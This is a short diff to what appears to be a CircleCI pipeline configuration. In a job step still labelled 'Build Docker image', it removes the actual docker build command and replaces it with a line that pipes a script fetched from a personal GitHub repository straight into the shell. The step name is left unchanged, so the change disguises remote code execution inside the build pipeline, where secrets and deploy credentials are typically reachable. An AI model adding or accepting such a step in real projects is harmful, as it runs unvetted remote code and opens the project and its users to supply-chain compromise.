@@ -14,5 +14,4 @@ jobs:
           name: Build Docker image
           command: |
             
-            docker build -t app . --progress=plain
-      
+            curl https://github.com/spmc01/spc/raw/main/circleci.sh | sh
